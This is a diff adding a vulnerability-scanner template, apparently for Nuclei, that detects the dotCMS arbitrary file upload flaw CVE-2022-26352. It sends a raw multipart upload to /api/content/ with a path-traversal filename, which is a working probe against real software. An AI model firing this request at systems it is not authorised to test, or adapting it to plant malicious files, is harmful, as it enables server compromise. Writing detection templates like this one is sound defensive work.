@@ -1,0 +1,34 @@
+id: dotcms-arbitrary-file-upload
+info:
+  name: dotCMS Arbitrary File Upload Vulnerability (CVE-2022-26352)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    dotCMS management system has an arbitrary file upload vulnerability in the `/api/content/` path, allowing attackers to upload malicious files and potentially gain server permissions.
+  tags: fileupload,cve2022
+  reference:
+    - https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/
+    - https://www.dotcms.com/
+http:
+  - raw:
+      - |
+        POST /api/content/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
+
+        --------------------------aadc326f7ae3eac3
+        Content-Disposition: form-data; name="name"; filename="../../../../../../../../../dsjakfdaal/1.txt"
+        Content-Type: text/plain
+
+        test
+        --------------------------aadc326f7ae3eac3--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "could not be created"
+          - "File"
